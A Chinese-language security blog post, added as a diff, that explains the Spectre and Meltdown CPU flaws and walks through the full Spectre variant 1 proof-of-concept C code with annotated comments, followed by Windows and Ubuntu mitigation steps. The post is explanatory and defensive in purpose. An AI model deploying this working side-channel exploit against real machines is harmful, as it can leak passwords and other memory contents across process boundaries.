@@ -1,0 +1,273 @@
+---
+layout:     post
+title:      "浅谈处理器级spectre attack及poc分析"
+subtitle:   " \"cpu内核\""
+date:       2018-01-09 09:10:25
+author:     "y1r0nz"
+header-img: "img/hack.jpg"
+tags:
+    - 安全研究
+---
+
+
+
+#### 0x01 背景
+
+​	关于meltdown和spectru相关研究最早是在2016年 Blackhat USA大会上有过相关的描述和猜想，研究人员发现，在现代的处理器架构的用户模式下，存在泄露内存区不可访问区域的敏感信息可能性，但是当时还没有具体的实现方法，之后才被格拉茨技术大学和其他联合实验室共同研究处实现方法。
+
+​	处理器级别漏洞一般可以影响整个云计算基础设施的发展历史，cpu本身的架构同时也面临着严峻的考验。在看了遍大致原理之后，结合之前在公司上cissp课的时候老师讲过的side channel attack侧信道攻击的相关知识，算是把漏洞基本上弄懂了。首先我们先来看下几个需要掌握的概念。
+
+* 乱序执行
+
+  ​	在cpu的流水线工作中，cpu处理执行指令如果采用顺序的方式，在处理性能上会产生比较大的开销。现代处理器优化了cpu处理指令的方式，程序指令在同样的单位时钟周期内通过乱序执行。所以，可能造成一种提前将需要执行的指令进行预执行的可能。这种方式虽然提高了cpu的指令处理效率，但是可能会成为内核漏洞利用的一种手段。用wiki上的例子解释
+
+  ```c
+  1. b = a * 5
+  2. v = * b
+  3. c = a + 3
+  ```
+
+  ​	这里由于1与3可并发运行，而2之b无法随即获得，因此可以先计算乘法1与加法3，再运行2
+
+* 地址空间
+
+  ​	每个进程在内存地址中都有自己的独立的内存空间，内存空间以PLT页表映射的方式将内存实际地址映射成虚拟地址，同时定义了内核地址特权保护相关手段。这样的内存空间主要分为用户可访问内存地址和不可访问的内核地址空间，
+
+  ![meltdown](/Users/y1r0nz/Downloads/meltdown.png)
+
+* 分支预测
+
+  CPU执行一条指令，一般来说，最少也要经过从内存中取指令，将指令译码解析成微操作（μOP），微操作最终驱动硬件电路部件三个步骤（简称取指令、译码和执行），如果执行一条指令，要等到这三个步骤都完成后，才能执行下一条指令，则一条指令执行时间过长（用CPU硬件术语说就是消耗多个时钟周期），CPU运行速度就无法得到有效提高，循序执行就是必须执行完当前指令才能执行下一条指令的执行方式。
+
+  为了解决这种问题，现代cpu使用分支预测的方式提前预测cpu将要执行的指令。我们用通俗点的一句话概括这种机制：**如果某一段时间内某一条件跳转都走向某一固定分支，则可以预测这条条件跳转指令下一次很大可能也走向这一分支**。
+
+* 隐藏信道攻击（side channel attack）
+
+  ​	为了提高内存IO效率，通常将经常使用的数据存放在cache中，cpu缓存通过在较小和较快的内存中缓存常用的数据来减少慢速内存访问延时带来的成本。现代cpu具有多级缓存机制，这些缓存通常可以提供给cpu内存使用，也可以提供给其他缓存共享使用，PLT表也可能存放在缓存中。
+
+  ​	我们用个通俗的例子来解释隐藏信道攻击的原理：假设现在有一个安全等级非常高的私密空间机构（类似于美国中央情报局），这个机构只能接受外部特定的情报消息（写），但不能将自己内部的一切信息泄漏给外部，（读），A是这个中央情报局的工作人员，B想拿到中央情报局的一些敏感资料供自己使用。B通过多种渠道认识了A，拿到了A的一些把柄，A的工作中也有B需要的敏感文件，A为了自己的名誉答应B的泄漏敏感文件要求。商量之后，B为了不让A暴露自己与A达成了一个协议；经过B的发现，A的办公室每天晚上12点左右关灯并且关灯的时间有偏差，B要求A通过一定的手段控制办公室的关灯时间以12点为分界点，十二点之前关灯信号计为1，十二点之后关灯信号记为0。这样B和A就源源不断的通过隐蔽的方式讲中央情报局的秘密泄露出来了。
+
+  ​	隐藏信道攻击也称为旁路攻击，这种攻击攻击是利用缓存引入的时序的差异方式对cpu内存进行攻击的一种方式。漏洞poc使用的是基于Flush+Reload的方式对缓存进行泄漏，这种攻击利用最后一级缓存，利用clflush刷新目标内存位置。通过测量重新加载数据所需的时间，攻击者可以确定数据是否由另一个进程同时加载到缓存中。
+
+  ​
+
+#### 0x02 meltdown攻击
+
+​	在理解完上述的几个关键点之后，我们再来看看meltdown这种攻击的真实利用过程。
+
+​	参考spectre attack上的代码片段
+
+```C
+if(x < array1_size)
+	y = array2[array1[x] * 256]
+```
+
+​	代码片段中首先判断了用户进程是否越界访问数组的非法访问区域。在某种程度上，这种方式防止了处理器越界访问非法访问的敏感数据区域。然而，在乱序执行的条件下，假设攻击者可以操纵x的值（对应array[x] = k）泄露单个byte的内存值，此时array1_size和array2没有cache到缓存中，但是k已经存入cache缓存了。攻击者此时可以让cpu多次执行判断为真的指令，执行多次后cpu会将下一条指令预见性的读取，这时候只要攻击者突然改变x为非法访问内存值，则可以让cpu误读取非法区域中的值，达到泄露非法地址内存信息的目的。
+
+
+
+#### 0x03 完整poc分析
+
+说完漏洞利用过程我们再来通读一下完整的poc代码。代码所有解释均在注释中有相关标注。
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#ifdef _MSC_VER //根据处理器架构（x86或者x64）来使用对应的宏包含的库
+#include <intrin.h> /* for rdtscp and clflush */  //flush缓存库，主要用来调用_mm_clflush（刷新缓存）和__rdtscp函数
+#pragma optimize("gt",on)
+#else
+#include <x86intrin.h> /* for rdtscp and clflush */ 
+#endif
+
+/********************************************************************
+ Victim code.
+********************************************************************/
+ unsigned int array1_size = 16; 
+ uint8_t unused1[64];
+ uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 }; //初始化array1数组，并至初始化数组前16个值，申请了160个int地址空间
+ uint8_t unused2[64];
+ uint8_t array2[256 * 512]; 
+
+ char *secret = "The Magic Words are Squeamish Ossifrage."; //设置密文字符串，存储在cpu内存中
+
+ uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
+
+/*根据前文分析的危险函数，此处x虽然设置了array1的上界检查，但是仍然可以通过cpu的乱序执行和分支预测执行内存不可访问区的越界访问，temp表示读取array2的byte值到缓存中*/
+ void victim_function(size_t x) {
+ 	if (x < array1_size) {
+ 		temp &= array2[array1[x] * 512];
+ 	}
+ }
+
+
+ /********************************************************************
+ Analysis code
+ ********************************************************************/
+ #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */ //缓存命中阀值，如果请求时间小于这个阀值，则意味着缓存命中
+
+ /* Report best guess in value[0] and runner-up in value[1] */
+//计算输出命中缓存最有可能的value值以及排第二的value
+ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+ 	static int results[256];
+ 	int tries, i, j, k, mix_i, junk = 0;
+	size_t training_x, x;
+ 	register uint64_t time1, time2;
+ 	volatile uint8_t *addr;
+
+ 	for (i = 0; i < 256; i++)
+ 	results[i] = 0;
+   //用大循环“训练”CPU的分支预测，让CPU微结构认为下次也应该走向读取内存这一分支
+ 	for (tries = 999; tries > 0; tries--) {
+ 	/* Flush array2[256*(0..255)] from cache */
+ 	for (i = 0; i < 256; i++) //清除array2数组的缓存
+ 	_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */ //使用_mm_clflush方法清除array2在cache中的缓存
+
+ 	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+ 	training_x = tries % array1_size;  //对应array1 x的合法访问位置
+    for(j = 29; j >= 0; j--) {
+ 	_mm_clflush(&array1_size); 
+ 	for(volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+
+      //如果j%6!=0 x=training_x 反之x=malicious_x
+ 	/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+ 	/* Avoid jumps in case those tip off the branch predictor */
+ 	x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+ 	x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+ 	x = training_x ^ (x & (malicious_x ^ training_x)); 
+
+ 	/* Call the victim! */
+ 	victim_function(x); //最终调用非法读取缓存函数
+
+ }
+
+ 	/* Time reads. Order is lightly mixed up to prevent stride prediction */
+    //这个循环判断array2缓存地址的访问时间，如果小于阀值，说明array2对应byte的位置已经缓存
+ 	for (i = 0; i < 256; i++) {
+ 		mix_i = ((i * 167) + 13) & 255; //这里我理解是，在循环中，让mix_i在0～255之间随机分布，mix_i用来返回字符ascii值
+ 		addr = &array2[mix_i * 512]; //取array2对应的地址，刚刚temp缓存过
+ 		time1 = __rdtscp(&junk); /* READ TIMER */ //获取上一个array2读取地址读取的时间
+ 		junk = *addr; /* MEMORY ACCESS TO TIME */ //获取array2内存中对应的地址值
+ 		time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */ //计算时间差（过去的时间）
+ 		if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) //如果读取单个byte cache缓存的时间小于阀值且访问的位置mix_i属于字符串数组界限以外，没有缓存的话redscp读的差不多是一个不变定值，有缓存的话会有大小改变，所以这里以前后访问缓存页面的时间差判断没有问题。
+ 			results[mix_i]++; /* cache hit - add +1 to score for this value */
+ 		}
+	/* Locate highest & second-highest results results tallies in j/k */
+      //通过循环确定最有可能和第二可能字符的ascii码值k，j
+ 	j = k = -1;
+ 	for (i = 0; i < 256; i++) {
+ 		if (j < 0 || results[i] >= results[j]) {
+ 			k = j;
+ 			j = i;
+ 		} else if (k < 0 || results[i] >= results[k]) {
+ 			k = i;
+ 		}
+ 	}
+ 	if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+ 	break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+ }
+ 	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
+ 	value[0] = (uint8_t)j;
+ 	score[0] = results[j];
+ 	value[1] = (uint8_t)k;
+ 	score[1] = results[k];
+ }
+
+int main(int argc, const char **argv) {
+        size_t malicious_x=(size_t)(secret-(char*)array1); /* default for malicious_x */ //注意，malicious_x实际上是指内存中的secret指针对应字符串地址相对于array1 byte数组的偏移值。
+        int i, score[2], len=40; //len对应于secret字符串长度，表示需要猜解泄露信息的长度， score数组存放猜解字符的可信度。
+        uint8_t value[2]; //value数组存放最终的猜测结果
+        for (i = 0; i < sizeof(array2); i++)
+                array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */ //初始化array2到内存
+        if (argc == 3) {
+                sscanf(argv[1], "%p", (void**)(&malicious_x));
+                malicious_x -= (size_t)array1; /* Convert input value into a pointer */
+                sscanf(argv[2], "%d", &len);
+        }
+
+        printf("Reading %d bytes:\n", len);
+        while (--len >= 0) {
+                printf("Reading at malicious_x = %p... ", (void*)malicious_x);
+                readMemoryByte(malicious_x++, value, score);
+                printf("%s: ", (score[0] >= 2*score[1]?"Success":"Unclear"));
+                printf("0x%02X=’%c’ score=%d  ", value[0],(value[0] > 31 && value[0] < 127?value[0]:'?'),score[0]); //打印value[0]中整型值对应的ascii可显示的字符（ascii可见范围为31～127）
+                if (score[1] > 0)
+         			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+                printf("\n");
+        }
+        return (0);
+}
+```
+
+在ubuntu 14.04 x86-64 上运行结果见下图：
+
+![meltdown2](/Users/y1r0nz/Downloads/meltdown2.png)
+
+
+
+#### 0x04 修复方法
+
+参考官方的解决方案，下面分别以win 8 x64 和 ubuntu 14.04 x86-64为例谈谈修复方案：
+
+* 针对windows 8.1的个人用户系统：
+
+  根据微软官方发布的补丁，需要用户使用windows自带的Powershell验证自己client是否存在speculative excution 分为以下几步：
+
+  1. 首先需要下载微软官方的powershell验证module包   <https://aka.ms/SpeculationControlPS>
+
+  2. 使用管理员权限打开powershell，解压下载的文件定位到文件目录，执行如下图所示命令验证是否存在风险
+
+     ![meltdown4](/Users/y1r0nz/Downloads/meltdown4.png)
+
+     发现解决分支预测问题的功能模块都未开启，存在漏洞利用可能。
+
+  3. 修改注册表键值，微软官方建议谨慎修改
+
+     ```powershell
+     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f
+
+     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f
+     ```
+
+  4. 修改完记得重启电脑生效
+
+  ​
+
+* 针对linux（以ubuntu 14.04为例）系统：
+
+  linux统一解决方案是使用KAISER的PTI页表隔离机制进行修复，但这种修复方案虽然解决了分支预测带来的威胁，但在一定程度上也降低了处理器的运行效率。漏洞验证以及修复方法分为以下几步：
+
+  1. 下载github上面的shell验证脚本
+
+     ```Shell
+     git clone https://github.com/paboldin/meltdown-exploit.git
+     ```
+
+  2. 运行如下命令验证处理器是否存在利用风险，
+
+     ![meltdown5](/Users/y1r0nz/Downloads/meltdown5.png)
+
+     如果vulnerable值为on表示存在漏洞利用风险。
+
+  3. 针对spectre攻击到目前为止ubuntu官方暂未发布版本更新，针对meltdown的补丁已经发布，用户可以手动及时更新自己的操作系统
+
+     ```Shell
+     sudo apt-get update
+     sudo apt-get dist-upgrade
+     ```
+
+     可以参考https://usn.ubuntu.com/usn/usn-3524-1/、https://wiki.ubuntu.com/Security/Upgrades
+
+
+
+#### 0x05 参考文献
+
+1. http://www.antiy.com/response/Meltdown+CPU-faq.html 《Meltdown攻击与CPU体系结构的简明FAQ》
+
+2. https://zh.wikipedia.org/wiki/%E4%B9%B1%E5%BA%8F%E6%89%A7%E8%A1%8C 乱序执行 from WiKi
+3. https://spectreattack.com/spectre.pdf?spm=a313e.7916648.0.0.42867d79FbbHHi&file=spectre.pdf 《Spectre Attack: Exploiting Speculative Execution》
+4. http://bbs.antiy.cn/forum.php?mod=viewthread&tid=77670&extra=page%3D1 译文版 《Spectre Attack: Exploiting Speculative Execution》by 安天
+5. https://lwn.net/Articles/738975/  KAISER: hiding the kernel from user space
+6. https://support.microsoft.com/en-us/help/4073119/protect-against-speculative-execution-side-channel-vulnerabilities-in Windows Client Guidance for IT Pros to protect against speculative execution side-channel vulnerabilities
+7. https://github.com/hannob/meltdownspectre-patches github上有关漏洞厂商相关跟踪信息的repo
